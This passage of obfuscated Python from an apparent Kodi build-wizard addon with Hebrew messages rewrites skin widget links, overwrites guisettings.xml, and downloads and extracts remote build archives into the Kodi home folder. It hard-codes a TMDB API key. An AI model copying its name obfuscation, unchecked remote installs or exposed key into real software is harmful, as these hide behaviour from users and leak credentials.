%22%5Cu05e4%5Cu05d5%5Cu05e4%5Cu05d5%5Cu05dc%5Cu05e8%5Cu05d9%22%2C+%22Tag%22%3A+%223%22%2C+%22id%22%3A+%22+%22%7D&video_data=%7B%22title%22%3A+%22%5Cu05e4%5Cu05d5%5Cu05e4%5Cu05d5%5Cu05dc%5Cu05e8%5Cu05d9%22%2C+%22mediatype%22%3A+%22movie%22%2C+%22TVshowtitle%22%3A+%22%22%2C+%22season%22%3A+0%2C+%22episode%22%3A+0%2C+%22OriginalTitle%22%3A+%22+%22%2C+%22rating%22%3A+%220%22%2C+%22plot%22%3A+%22%5Cu05e4%5Cu05d5%5Cu05e4%5Cu05d5%5Cu05dc%5Cu05e8%5Cu05d9%22%2C+%22Tag%22%3A+%223%22%2C+%22id%22%3A+%22+%22%7D&reload=$INFO[Window(Home).Property(widgetreload-movies)]''')#line:3811
        if KODI_VERSION <=18 :#line:3813
            OOO000OO00000OO00 =open (O000OOOOO0OO00O00 ,'w')#line:3814
            OOO000OO00000OO00 .write (OO0O00000O00O00O0 )#line:3815
            OOO000OO00000OO00 .close ()#line:3816
        else :#line:3819
            OOO000OO00000OO00 =open (O000OOOOO0OO00O00 ,'w',encoding ='utf-8')#line:3820
            OOO000OO00000OO00 .write (OO0O00000O00O00O0 )#line:3821
            OOO000OO00000OO00 .close ()#line:3822
def tv_widget_tele (notify =''):#line:3823
        if notify =='true':#line:3824
            wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]הוידגט הוגדר להרחבה טלמדיה[/COLOR]"%COLOR2 )#line:3825
            xbmc .executebuiltin ("ActivateWindow(home)")#line:3826
        wiz .setS ('tele_widget','true')#line:3827
        wiz .setS ('mando_widget','false')#line:3828
        OOOOOOO0OO00O0OOO =os .path .join (translatepath ("special://home/"),"userdata","addon_data","script.skinshortcuts","skin.Premium.mod.properties")#line:3829
        if KODI_VERSION <=18 :#line:3832
            O0OO0OOOO0OO0OO00 =open (OOOOOOO0OO00O0OOO ,'r')#line:3834
            O00O00OOO0O000O0O =O0OO0OOOO0OO0OO00 .read ()#line:3835
            O0OO0OOOO0OO0OO00 .close ()#line:3836
        else :#line:3839
            O0OO0OOOO0OO0OO00 =open (OOOOOOO0OO00O0OOO ,'r',encoding ='utf-8')#line:3840
            O00O00OOO0O000O0O =O0OO0OOOO0OO0OO00 .read ()#line:3841
            O0OO0OOOO0OO0OO00 .close ()#line:3842
        O00O00OOO0O000O0O =O00O00OOO0O000O0O .replace ('''plugin://plugin.video.mando/?mode=14&iconimage=C%3A%5CUsers%5CHome%5CAppData%5CRoaming%5CKodi%5Caddons%5Cplugin.video.mando%5Cresources%5Cartwork%2Fpopular.png&fanart=https%3A%2F%2Fi.pinimg.com%2F236x%2F1c%2F49%2F8f%2F1c498f196ef8818d3d01223b72678fc4--divergent-movie-poster-divergent-.jpg&description=%D7%A4%D7%95%D7%A4%D7%95%D7%9C%D7%A8%D7%99&url=https%3A%2F%2Fapi.themoviedb.org%2F3%2Fdiscover%2Ftv%2F%3Fapi_key%3D34142515d9d23817496eeb4ff1d223d0%26language%3Dhe%26sort_by%3Dpopularity.desc%26include_null_first_air_dates%3Dfalse%26with_original_language%3Den%26page%3D1&name=%D7%A4%D7%95%D7%A4%D7%95%D7%9C%D7%A8%D7%99&image_master=&heb_name=+&last_id=&dates=+&data=+&original_title=+&id=+&season=+&episode=+&tmdbid=+&eng_name=+&show_original_year=+&isr=0&fav_status=false&search_db=&iconimage=C%3A%5CUsers%5CHome%5CAppData%5CRoaming%5CKodi%5Caddons%5Cplugin.video.mando%5Cresources%5Cartwork%2Fpopular.png&fanart=https%3A%2F%2Fi.pinimg.com%2F236x%2F1c%2F49%2F8f%2F1c498f196ef8818d3d01223b72678fc4--divergent-movie-poster-divergent-.jpg&description=%D7%A4%D7%95%D7%A4%D7%95%D7%9C%D7%A8%D7%99&url=https%3A%2F%2Fapi.themoviedb.org%2F3%2Fdiscover%2Ftv%2F%3Fapi_key%3D34142515d9d23817496eeb4ff1d223d0%26language%3Dhe%26sort_by%3Dpopularity.desc%26include_null_first_air_dates%3Dfalse%26with_original_language%3Den%26page%3D1&name=%D7%A4%D7%95%D7%A4%D7%95%D7%9C%D7%A8%D7%99&image_master=&heb_name=+&last_id=&dates=+&data=+&original_title=+&id=+&season=+&episode=+&tmdbid=+&eng_name=+&show_original_year=+&fav_status=false&search_db=&video_data=%7B%22title%22%3A+%22%5Cu05e4%5Cu05d5%5Cu05e4%5Cu05d5%5Cu05dc%5Cu05e8%5Cu05d9%22%2C+%22mediatype%22%3A+%22movie%22%2C+%22TVshowtitle%22%3A+%22%22%2C+%22season%22%3A+0%2C+%22episode%22%3A+0%2C+%22OriginalTitle%22%3A+%22+%22%2C+%22rating%22%3A+%220%22%2C+%22plot%22%3A+%22%5Cu05e4%5Cu05d5%5Cu05e4%5Cu05d5%5Cu05dc%5Cu05e8%5Cu05d9%22%2C+%22Tag%22%3A+%223%22%2C+%22id%22%3A+%22+%22%7D&video_data=%7B%22title%22%3A+%22%5Cu05e4%5Cu05d5%5Cu05e4%5Cu05d5%5Cu05dc%5Cu05e8%5Cu05d9%22%2C+%22mediatype%22%3A+%22movie%22%2C+%22TVshowtitle%22%3A+%22%22%2C+%22season%22%3A+0%2C+%22episode%22%3A+0%2C+%22OriginalTitle%22%3A+%22+%22%2C+%22rating%22%3A+%220%22%2C+%22plot%22%3A+%22%5Cu05e4%5Cu05d5%5Cu05e4%5Cu05d5%5Cu05dc%5Cu05e8%5Cu05d9%22%2C+%22Tag%22%3A+%223%22%2C+%22id%22%3A+%22+%22%7D&reload=$INFO[Window(Home).Property(widgetreload-movies)]''','''plugin://plugin.video.telemedia/?mode=14&iconimage=special://home/addons/plugin.video.telemedia/tele/Tv_Show/popular_tv.png&fanart=special://home/addons/plugin.video.telemedia/tele/tv_fanart.png&description=%D7%A1%D7%93%D7%A8%D7%95%D7%AA+%D7%A4%D7%95%D7%A4%D7%95%D7%9C%D7%A8%D7%99%D7%95%D7%AA&url=https%3A%2F%2Fapi.themoviedb.org%2F3%2Fdiscover%2Ftv%2F%3Fapi_key%3D34142515d9d23817496eeb4ff1d223d0%26language%3Dhe%26sort_by%3Dpopularity.desc%26include_null_first_air_dates%3Dfalse%26with_original_language%3Den%26page%3D1&name=%D7%A1%D7%93%D7%A8%D7%95%D7%AA+%D7%A4%D7%95%D7%A4%D7%95%D7%9C%D7%A8%D7%99%D7%95%D7%AA&image_master=&heb_name=+&last_id=&dates= &data= &original_title= &id= &season= &episode= &tmdbid= &eng_name= &show_original_year= &isr=0&fav_status=false&groups_id=0&video_data=%7B%22title%22%3A+%22%5Cu05e1%5Cu05d3%5Cu05e8%5Cu05d5%5Cu05ea+%5Cu05e4%5Cu05d5%5Cu05e4%5Cu05d5%5Cu05dc%5Cu05e8%5Cu05d9%5Cu05d5%5Cu05ea%22%2C+%22label%22%3A+%22+%22%2C+%22OriginalTitle%22%3A+%22+%22%2C+%22imdbnumber%22%3A+%22+%22%2C+%22imdbid%22%3A+%22+%22%2C+%22year%22%3A+%22+%22%2C+%22mediatype%22%3A+%22movie%22%2C+%22TVshowtitle%22%3A+%22%22%2C+%22rating%22%3A+%220%22%2C+%22plot%22%3A+%22%5Cu05e1%5Cu05d3%5Cu05e8%5Cu05d5%5Cu05ea+%5Cu05e4%5Cu05d5%5Cu05e4%5Cu05d5%5Cu05dc%5Cu05e8%5Cu05d9%5Cu05d5%5Cu05ea%22%2C+%22dateadded%22%3A+%22+00%3A00%3A00%22%7D&video_data=%7B%22title%22%3A+%22%5Cu05e1%5Cu05d3%5Cu05e8%5Cu05d5%5Cu05ea+%5Cu05e4%5Cu05d5%5Cu05e4%5Cu05d5%5Cu05dc%5Cu05e8%5Cu05d9%5Cu05d5%5Cu05ea%22%2C+%22label%22%3A+%22+%22%2C+%22OriginalTitle%22%3A+%22+%22%2C+%22imdbnumber%22%3A+%22+%22%2C+%22imdbid%22%3A+%22+%22%2C+%22year%22%3A+%22+%22%2C+%22mediatype%22%3A+%22movie%22%2C+%22TVshowtitle%22%3A+%22%22%2C+%22rating%22%3A+%220%22%2C+%22plot%22%3A+%22%5Cu05e1%5Cu05d3%5Cu05e8%5Cu05d5%5Cu05ea+%5Cu05e4%5Cu05d5%5Cu05e4%5Cu05d5%5Cu05dc%5Cu05e8%5Cu05d9%5Cu05d5%5Cu05ea%22%2C+%22dateadded%22%3A+%22+00%3A00%3A00%22%7D&reload=$INFO[Window(Home).Property(widgetreload-movies)]''')#line:3845
        if KODI_VERSION <=18 :#line:3847
            O0OO0OOOO0OO0OO00 =open (OOOOOOO0OO00O0OOO ,'w')#line:3848
            O0OO0OOOO0OO0OO00 .write (O00O00OOO0O000O0O )#line:3849
            O0OO0OOOO0OO0OO00 .close ()#line:3850
        else :#line:3853
            O0OO0OOOO0OO0OO00 =open (OOOOOOO0OO00O0OOO ,'w',encoding ='utf-8')#line:3854
            O0OO0OOOO0OO0OO00 .write (O00O00OOO0O000O0O )#line:3855
            O0OO0OOOO0OO0OO00 .close ()#line:3856
def fix_gui ():#line:3858
    if KODIV >=17 and KODIV <18 :#line:3861
        try :#line:3863
            OOOOO0OOO0O0O0O00 =os .path .join (translatepath ("special://home/"),"addons","plugin.program.Anonymous","skinfix","17","guisettings.xml")#line:3864
            OOOOOO00OO0O0OOO0 =os .path .join (translatepath ("special://home/"),"userdata","guisettings.xml")#line:3865
            copyfile (OOOOO0OOO0O0O0O00 ,OOOOOO00OO0O0OOO0 )#line:3866
        except :#line:3867
            OOOOO0OOO0O0O0O00 =os .path .join (translatepath ("special://home/"),"addons","plugin.program.Anonymous","skinfix","17","guisettings.xml")#line:3868
            OOOOOO00OO0O0OOO0 =os .path .join (translatepath ("special://masterprofile/"),"userdata","guisettings.xml")#line:3869
            copyfile (OOOOO0OOO0O0O0O00 ,OOOOOO00OO0O0OOO0 )#line:3870
    else :#line:3871
        O00OOO0O0000O00O0 =os .path .join (translatepath ("special://userdata"),"guisettings.xml")#line:3872
        if KODI_VERSION <=18 :#line:3873
            OOO0OO0000OOOOO0O =open (O00OOO0O0000O00O0 ,'r')#line:3875
            OO000OO000O000O00 =OOO0OO0000OOOOO0O .read ()#line:3876
            OOO0OO0000OOOOO0O .close ()#line:3877
        else :#line:3878
            OOO0OO0000OOOOO0O =open (O00OOO0O0000O00O0 ,'r',encoding ='utf-8')#line:3879
            OO000OO000O000O00 =OOO0OO0000OOOOO0O .read ()#line:3880
            OOO0OO0000OOOOO0O .close ()#line:3881
        try :#line:3884
            O0O0O0000OOO0O00O ='<setting id="window.width">(.+?)</setting>'#line:3885
            OO0O0O000OO0O0O0O =re .compile (O0O0O0000OOO0O00O ).findall (OO000OO000O000O00 )[0 ]#line:3886
            if KODI_VERSION <=18 :#line:3887
                OOO0OO0000OOOOO0O =open (O00OOO0O0000O00O0 ,'w')#line:3888
                OOO0OO0000OOOOO0O .write (OO000OO000O000O00 .replace ('<setting id="window.width">%s</setting>'%OO0O0O000OO0O0O0O ,'<setting id="window.width" default="true">720</setting>'))#line:3889
                OOO0OO0000OOOOO0O .close ()#line:3890
            else :#line:3891
                OOO0OO0000OOOOO0O =open (O00OOO0O0000O00O0 ,'w',encoding ='utf-8')#line:3892
                OOO0OO0000OOOOO0O .write (OO000OO000O000O00 .replace ('<setting id="window.width">%s</setting>'%OO0O0O000OO0O0O0O ,'<setting id="window.width" default="true">720</setting>'))#line:3893
                OOO0OO0000OOOOO0O .close ()#line:3894
        except :pass #line:3895
        if KODI_VERSION <=18 :#line:3899
            OOO0OO0000OOOOO0O =open (O00OOO0O0000O00O0 ,'r')#line:3901
            O00O0OOO0OO0O00O0 =OOO0OO0000OOOOO0O .read ()#line:3902
            OOO0OO0000OOOOO0O .close ()#line:3903
        else :#line:3904
            OOO0OO0000OOOOO0O =open (O00OOO0O0000O00O0 ,'r',encoding ='utf-8')#line:3905
            O00O0OOO0OO0O00O0 =OOO0OO0000OOOOO0O .read ()#line:3906
            OOO0OO0000OOOOO0O .close ()#line:3907
        try :#line:3909
            OO00O00OOO000O0O0 ='<setting id="window.height">(.+?)</setting>'#line:3910
            O0OO00O000O0OO00O =re .compile (OO00O00OOO000O0O0 ).findall (O00O0OOO0OO0O00O0 )[0 ]#line:3911
            if KODI_VERSION <=18 :#line:3912
                OOO0OO0000OOOOO0O =open (O00OOO0O0000O00O0 ,'w')#line:3913
                OOO0OO0000OOOOO0O .write (O00O0OOO0OO0O00O0 .replace ('<setting id="window.height">%s</setting>'%O0OO00O000O0OO00O ,'<setting id="window.height" default="true">480</setting>'))#line:3914
                OOO0OO0000OOOOO0O .close ()#line:3915
            else :#line:3916
                OOO0OO0000OOOOO0O =open (O00OOO0O0000O00O0 ,'w',encoding ='utf-8')#line:3917
                OOO0OO0000OOOOO0O .write (O00O0OOO0OO0O00O0 .replace ('<setting id="window.height">%s</setting>'%O0OO00O000O0OO00O ,'<setting id="window.height" default="true">480</setting>'))#line:3918
                OOO0OO0000OOOOO0O .close ()#line:3919
        except :pass #line:3920
        if KODI_VERSION <=18 :#line:3923
            OOO0OO0000OOOOO0O =open (O00OOO0O0000O00O0 ,'r')#line:3925
            O0OOO0O0OOOO0000O =OOO0OO0000OOOOO0O .read ()#line:3926
            OOO0OO0000OOOOO0O .close ()#line:3927
        else :#line:3928
            OOO0OO0000OOOOO0O =open (O00OOO0O0000O00O0 ,'r',encoding ='utf-8')#line:3929
            O0OOO0O0OOOO0000O =OOO0OO0000OOOOO0O .read ()#line:3930
            OOO0OO0000OOOOO0O .close ()#line:3931
        try :#line:3932
            OO00OOO00OOOO00O0 ='<setting id="videoscreen.screen">(.+?)</setting>'#line:3933
            OO0O000O0O0OO0O00 =re .compile (OO00OOO00OOOO00O0 ).findall (O0OOO0O0OOOO0000O )[0 ]#line:3934
            if KODI_VERSION <=18 :#line:3935
                OOO0OO0000OOOOO0O =open (O00OOO0O0000O00O0 ,'w')#line:3936
                OOO0OO0000OOOOO0O .write (O0OOO0O0OOOO0000O .replace ('<setting id="videoscreen.screen">%s</setting>'%OO0O000O0O0OO0O00 ,'<setting id="videoscreen.screen" default="true">0</setting>'))#line:3937
                OOO0OO0000OOOOO0O .close ()#line:3938
            else :#line:3939
                OOO0OO0000OOOOO0O =open (O00OOO0O0000O00O0 ,'w',encoding ='utf-8')#line:3940
                OOO0OO0000OOOOO0O .write (O0OOO0O0OOOO0000O .replace ('<setting id="videoscreen.screen">%s</setting>'%OO0O000O0O0OO0O00 ,'<setting id="videoscreen.screen" default="true">0</setting>'))#line:3941
                OOO0OO0000OOOOO0O .close ()#line:3942
        except :pass #line:3943
        if KODI_VERSION <=18 :#line:3945
            OOO0OO0000OOOOO0O =open (O00OOO0O0000O00O0 ,'r')#line:3947
            O00000O00O0O0OO0O =OOO0OO0000OOOOO0O .read ()#line:3948
            OOO0OO0000OOOOO0O .close ()#line:3949
        else :#line:3950
            OOO0OO0000OOOOO0O =open (O00OOO0O0000O00O0 ,'r',encoding ='utf-8')#line:3951
            O00000O00O0O0OO0O =OOO0OO0000OOOOO0O .read ()#line:3952
            OOO0OO0000OOOOO0O .close ()#line:3953
        try :#line:3954
            OO0O00OOO00000OO0 ='<setting id="videoscreen.screenmode">(.+?)</setting>'#line:3955
            OOO00O0OOO0O00OOO =re .compile (OO0O00OOO00000OO0 ).findall (O00000O00O0O0OO0O )[0 ]#line:3956
            if KODI_VERSION <=18 :#line:3957
                OOO0OO0000OOOOO0O =open (O00OOO0O0000O00O0 ,'w')#line:3958
                OOO0OO0000OOOOO0O .write (O00000O00O0O0OO0O .replace ('<setting id="videoscreen.screenmode">%s</setting>'%OOO00O0OOO0O00OOO ,'<setting id="videoscreen.screenmode" default="true">DESKTOP</setting>'))#line:3959
                OOO0OO0000OOOOO0O .close ()#line:3960
            else :#line:3961
                OOO0OO0000OOOOO0O =open (O00OOO0O0000O00O0 ,'w',encoding ='utf-8')#line:3963
                OOO0OO0000OOOOO0O .write (O00000O00O0O0OO0O .replace ('<setting id="videoscreen.screenmode">%s</setting>'%OOO00O0OOO0O00OOO ,'<setting id="videoscreen.screenmode" default="true">DESKTOP</setting>'))#line:3964
                OOO0OO0000OOOOO0O .close ()#line:3965
        except :pass #line:3966
        if KODI_VERSION <=18 :#line:3968
            OOO0OO0000OOOOO0O =open (O00OOO0O0000O00O0 ,'r')#line:3970
            OOO0O000O00000O00 =OOO0OO0000OOOOO0O .read ()#line:3971
            OOO0OO0000OOOOO0O .close ()#line:3972
        else :#line:3973
            OOO0OO0000OOOOO0O =open (O00OOO0O0000O00O0 ,'r',encoding ='utf-8')#line:3974
            OOO0O000O00000O00 =OOO0OO0000OOOOO0O .read ()#line:3975
            OOO0OO0000OOOOO0O .close ()#line:3976
        try :#line:3977
            O0O000OOO00000OO0 ='<setting id="videoscreen.resolution">(.+?)</setting>'#line:3978
            OO0OOOOO0OO0OOOO0 =re .compile (O0O000OOO00000OO0 ).findall (OOO0O000O00000O00 )[0 ]#line:3979
            if KODI_VERSION <=18 :#line:3980
                OOO0OO0000OOOOO0O =open (O00OOO0O0000O00O0 ,'w')#line:3981
                OOO0OO0000OOOOO0O .write (OOO0O000O00000O00 .replace ('<setting id="videoscreen.resolution">%s</setting>'%OO0OOOOO0OO0OOOO0 ,'<setting id="videoscreen.resolution">60</setting>'))#line:3982
                OOO0OO0000OOOOO0O .close ()#line:3983
            else :#line:3984
                OOO0OO0000OOOOO0O =open (O00OOO0O0000O00O0 ,'w',encoding ='utf-8')#line:3985
                OOO0OO0000OOOOO0O .write (OOO0O000O00000O00 .replace ('<setting id="videoscreen.resolution">%s</setting>'%OO0OOOOO0OO0OOOO0 ,'<setting id="videoscreen.resolution">60</setting>'))#line:3986
                OOO0OO0000OOOOO0O .close ()#line:3987
        except :pass #line:3988
        if KODI_VERSION <=18 :#line:3990
            OOO0OO0000OOOOO0O =open (O00OOO0O0000O00O0 ,'r')#line:3992
            O000OOOOO00OO000O =OOO0OO0000OOOOO0O .read ()#line:3993
            OOO0OO0000OOOOO0O .close ()#line:3994
        else :#line:3995
            OOO0OO0000OOOOO0O =open (O00OOO0O0000O00O0 ,'r',encoding ='utf-8')#line:3996
            O000OOOOO00OO000O =OOO0OO0000OOOOO0O .read ()#line:3997
            OOO0OO0000OOOOO0O .close ()#line:3998
        try :#line:3999
            O0O0O000O0O0OO000 ='<setting id="audiooutput.audiodevice">(.+?)</setting>'#line:4000
            OO00O0OOO0O0000OO =re .compile (O0O0O000O0O0OO000 ).findall (O000OOOOO00OO000O )[0 ]#line:4001
            if KODI_VERSION <=18 :#line:4002
                OOO0OO0000OOOOO0O =open (O00OOO0O0000O00O0 ,'w')#line:4003
                OOO0OO0000OOOOO0O .write (O000OOOOO00OO000O .replace ('<setting id="audiooutput.audiodevice">%s</setting>'%OO00O0OOO0O0000OO ,'<setting id="audiooutput.audiodevice" default="true">DIRECTSOUND:default</setting>'))#line:4004
                OOO0OO0000OOOOO0O .close ()#line:4005
            else :#line:4006
                OOO0OO0000OOOOO0O =open (O00OOO0O0000O00O0 ,'w',encoding ='utf-8')#line:4007
                OOO0OO0000OOOOO0O .write (O000OOOOO00OO000O .replace ('<setting id="audiooutput.audiodevice">%s</setting>'%OO00O0OOO0O0000OO ,'<setting id="audiooutput.audiodevice" default="true">DIRECTSOUND:default</setting>'))#line:4008
                OOO0OO0000OOOOO0O .close ()#line:4009
        except :pass #line:4010
        if KODI_VERSION <=18 :#line:4012
            OOO0OO0000OOOOO0O =open (O00OOO0O0000O00O0 ,'r')#line:4014
            O000O00000O000O00 =OOO0OO0000OOOOO0O .read ()#line:4015
            OOO0OO0000OOOOO0O .close ()#line:4016
        else :#line:4017
            OOO0OO0000OOOOO0O =open (O00OOO0O0000O00O0 ,'r',encoding ='utf-8')#line:4018
            O000O00000O000O00 =OOO0OO0000OOOOO0O .read ()#line:4019
            OOO0OO0000OOOOO0O .close ()#line:4020
        try :#line:4021
            OOOO00OO00OOO00O0 ='<setting id="audiooutput.passthroughdevice">(.+?)</setting>'#line:4022
            O0O0OOO000O0OOO00 =re .compile (OOOO00OO00OOO00O0 ).findall (O000O00000O000O00 )[0 ]#line:4023
            if KODI_VERSION <=18 :#line:4024
                OOO0OO0000OOOOO0O =open (O00OOO0O0000O00O0 ,'w')#line:4025
                OOO0OO0000OOOOO0O .write (O000O00000O000O00 .replace ('<setting id="audiooutput.passthroughdevice">%s</setting>'%O0O0OOO000O0OOO00 ,'<setting id="audiooutput.passthroughdevice" default="true">DIRECTSOUND:default</setting>'))#line:4026
                OOO0OO0000OOOOO0O .close ()#line:4027
            else :#line:4028
                OOO0OO0000OOOOO0O =open (O00OOO0O0000O00O0 ,'w',encoding ='utf-8')#line:4029
                OOO0OO0000OOOOO0O .write (O000O00000O000O00 .replace ('<setting id="audiooutput.passthroughdevice">%s</setting>'%O0O0OOO000O0OOO00 ,'<setting id="audiooutput.passthroughdevice" default="true">DIRECTSOUND:default</setting>'))#line:4030
                OOO0OO0000OOOOO0O .close ()#line:4031
        except :pass #line:4032
def fixguikodi_1 ():#line:4034
    if KODIV >=19 and KODIV <21 :#line:4035
      try :#line:4036
        O0O00OOO000O0000O =os .path .join (translatepath ("special://home/media"),"guifix","19","guisettings.xml")#line:4037
        O000O0O00O0O0O00O =os .path .join (translatepath ("special://home/"),"userdata","guisettings.xml")#line:4038
        copyfile (O0O00OOO000O0000O ,O000O0O00O0O0O00O )#line:4039
      except :#line:4040
        O0O00OOO000O0000O =os .path .join (translatepath ("special://home/media"),"guifix","19","guisettings.xml")#line:4041
        O000O0O00O0O0O00O =os .path .join (translatepath ("special://masterprofile/"),"userdata","guisettings.xml")#line:4042
        copyfile (O0O00OOO000O0000O ,O000O0O00O0O0O00O )#line:4043
    if KODIV >=18 and KODIV <19 :#line:4044
      try :#line:4045
        O0O00OOO000O0000O =os .path .join (translatepath ("special://home/media"),"guifix","18","guisettings.xml")#line:4046
        O000O0O00O0O0O00O =os .path .join (translatepath ("special://home/"),"userdata","guisettings.xml")#line:4047
        copyfile (O0O00OOO000O0000O ,O000O0O00O0O0O00O )#line:4048
      except :#line:4049
        O0O00OOO000O0000O =os .path .join (translatepath ("special://home/media"),"guifix","18","guisettings.xml")#line:4050
        O000O0O00O0O0O00O =os .path .join (translatepath ("special://masterprofile/"),"userdata","guisettings.xml")#line:4051
        copyfile (O0O00OOO000O0000O ,O000O0O00O0O0O00O )#line:4052
    if KODIV >=17 and KODIV <18 :#line:4053
      try :#line:4054
        O0O00OOO000O0000O =os .path .join (translatepath ("special://home/media"),"guifix","17","guisettings.xml")#line:4055
        O000O0O00O0O0O00O =os .path .join (translatepath ("special://home/"),"userdata","guisettings.xml")#line:4056
        copyfile (O0O00OOO000O0000O ,O000O0O00O0O0O00O )#line:4057
      except :#line:4058
        O0O00OOO000O0000O =os .path .join (translatepath ("special://home/media"),"guifix","17","guisettings.xml")#line:4059
        O000O0O00O0O0O00O =os .path .join (translatepath ("special://masterprofile/"),"userdata","guisettings.xml")#line:4060
        copyfile (O0O00OOO000O0000O ,O000O0O00O0O0O00O )#line:4061
def buildWizard (OOO0OOOO0000O0O00 ,O0OOO0O0O0OOO0OOO ,theme =None ,over =False ):#line:4065
    if KODI_VERSION <=18 :#line:4066
        OO0O0O00O00000000 =xbmcgui .DialogBusy ()#line:4067
        OO0O0O00O00000000 .create ()#line:4068
    else :#line:4069
        xbmc .executebuiltin ('ActivateWindow(busydialognocancel)')#line:4070
    if USERNAME =='':#line:4072
        ADDON .openSettings ()#line:4073
        xbmc .executebuiltin ('Dialog.Close(busydialognocancel)')#line:4074
        sys .exit ()#line:4075
    if PASSWORD =='':#line:4076
        ADDON .openSettings ()#line:4077
        xbmc .executebuiltin ('Dialog.Close(busydialognocancel)')#line:4078
        sys .exit ()#line:4079
    if O0OOO0O0O0OOO0OOO =='gui':#line:4081
        O0O0OOOO0O00OOO00 =wiz .checkBuild (OOO0OOOO0000O0O00 ,'gui')#line:4086
        O0O000OOOOOOOOO00 =OOO0OOOO0000O0O00 .replace ('\\','').replace ('/','').replace (':','').replace ('*','').replace ('?','').replace ('"','').replace ('<','').replace ('>','').replace ('|','')#line:4087
        if not wiz .workingURL (O0O0OOOO0O00OOO00 )==True :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]עדכון המערכת אינו זמין כעת, נסו שוב מאוחר יותר.[/COLOR]'%COLOR2 );return #line:4088
        if not os .path .exists (PACKAGES ):os .makedirs (PACKAGES )#line:4089
        DP .create (ADDONTITLE ,'[COLOR %s][B]מוריד עדכון:[/B][/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR2 ,COLOR1 ,OOO0OOOO0000O0O00 )+'\n'+''+'\n'+'אנא המתן')#line:4090
        O0OOO0O000OOOOO0O =os .path .join (PACKAGES ,'%s_guisettings.zip'%O0O000OOOOOOOOO00 )#line:4091
        O00O00OO00O00OO00 ='עדכון מערכת'#line:4094
        if 'google'in O0O0OOOO0O00OOO00 :#line:4095
           googledrive_download (O0O0OOOO0O00OOO00 ,O0OOO0O000OOOOO0O ,DP ,wiz .checkBuild (OOO0OOOO0000O0O00 ,'updatesize'))#line:4096
        else :#line:4097
          downloader .download (O0O0OOOO0O00OOO00 ,O0OOO0O000OOOOO0O ,DP )#line:4098
        xbmc .sleep (100 )#line:4099
        OOO00O0000OO00O0O ='[COLOR %s][/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR2 ,COLOR1 ,O00O00OO00O00OO00 )#line:4100
        DP .update (0 ,OOO00O0000OO00O0O +'\n'+''+'\n'+'אנא המתן')#line:4101
        extract .all (O0OOO0O000OOOOO0O ,HOME ,DP ,title =OOO00O0000OO00O0O )#line:4102
        DP .close ()#line:4103
        try :os .remove (O0OOO0O000OOOOO0O )#line:4106
        except :pass #line:4107
        wiz .kodi17Fix ()#line:4108
        if KODIV >=18 and KODIV <19 :#line:4109
            skindialogsettind18 ()#line:4110
        fix_Dialog_Settings17 ()#line:4113
        if INSTALLMETHOD ==1 :OOO00O0OO0OOOOOOO =1 #line:4115
        elif INSTALLMETHOD ==2 :OOO00O0OO0OOOOOOO =0 #line:4116
        else :DP .close ()#line:4117
        xbmc .executebuiltin ('Dialog.Close(busydialognocancel)')#line:4123
        O00000O00O000O00O =[]#line:4124
        O00000O00O000O00O .append (Thread (indicatorfastupdate ))#line:4125
        O00000O00O000O00O [0 ].start ()#line:4127
        if wiz .getS ("dragon")=='true':#line:4128
          try :#line:4129
              dragon_menu_hub ()#line:4130
          except Exception as OOO0OOO000OOOOO0O :#line:4131
             logging .warning ('dragon hub errrrrrrror'+str (OOO0OOO000OOOOO0O ))#line:4132
        if wiz .getS ('sex')=='false':#line:4133
            sex_menu_luck (notify ='false')#line:4134
        wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]המערכת עודכנה בהצלחה![/COLOR]'%COLOR2 )#line:4135
    elif O0OOO0O0O0OOO0OOO =='fresh':#line:4141
            if USERNAME =='':#line:4143
                ADDON .openSettings ()#line:4144
                sys .exit ()#line:4145
            if not BUILDNAME =='':#line:4146
                O00000O0O00OOOO0O =xbmcgui .Dialog ()#line:4147
                OOO0000OOOOO0O0OO =O00000O0O00OOOO0O .yesno (ADDONTITLE ,"הבילד כבר מותקן, האם תרצה להתקין אותו מחדש? או לנסות לחזור לבילד?",yeslabel ="[B][COLOR WHITE]כן[/COLOR][/B]",nolabel ="[B][COLOR white]לחזור לבילד[/COLOR][/B]")#line:4148
                if OOO0000OOOOO0O0OO ==0 :#line:4149
                    backtokodi ()#line:4150
                    sys .exit ()#line:4151
            check ()#line:4152
            OOOOO0OO00O0O0O0O =u_list (ld (BL ))#line:4153
            O00000O00O000O00O =[]#line:4156
            O00000O00O000O00O .append (Thread (wiz .LogNotify ,"[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]ההתקנה מתחילה, אנא המתן...[/COLOR]'%COLOR2 ))#line:4157
            O00000O00O000O00O [0 ].start ()#line:4159
            freshStart (OOO0OOOO0000O0O00 )#line:4163
            xbmc .executebuiltin ('ActivateWindow(busydialognocancel)')#line:4164
            O0O0OOOO0O00OOO00 =wiz .checkBuild (OOO0OOOO0000O0O00 ,'url')#line:4165
            O0O000OOOOOOOOO00 =OOO0OOOO0000O0O00 .replace ('\\','').replace ('/','').replace (':','').replace ('*','').replace ('?','').replace ('"','').replace ('<','').replace ('>','').replace ('|','')#line:4166
            if not os .path .exists (PACKAGES ):os .makedirs (PACKAGES )#line:4168
            DP .create (ADDONTITLE ,'[B]Downloading:[/B][COLOR %s][B][/B][/COLOR] [COLOR %s]%s v%s[/COLOR]'%(COLOR2 ,COLOR1 ,OOO0OOOO0000O0O00 ,wiz .checkBuild (OOO0OOOO0000O0O00 ,'version'))+'\n'+''+'\n'+'Please Wait')#line:4169
            O0OOO0O000OOOOO0O =os .path .join (PACKAGES ,'%s.zip'%O0O000OOOOOOOOO00 )#line:4171
            try :os .remove (O0OOO0O000OOOOO0O )#line:4173
            except :pass #line:4174
            if 'google'in O0O0OOOO0O00OOO00 :#line:4177
                googledrive_download (O0O0OOOO0O00OOO00 ,O0OOO0O000OOOOO0O ,DP ,wiz .checkBuild (OOO0OOOO0000O0O00 ,'filesize'))#line:4178
            else :#line:4180
                downloader .download (O0O0OOOO0O00OOO00 ,O0OOO0O000OOOOO0O ,DP )#line:4181
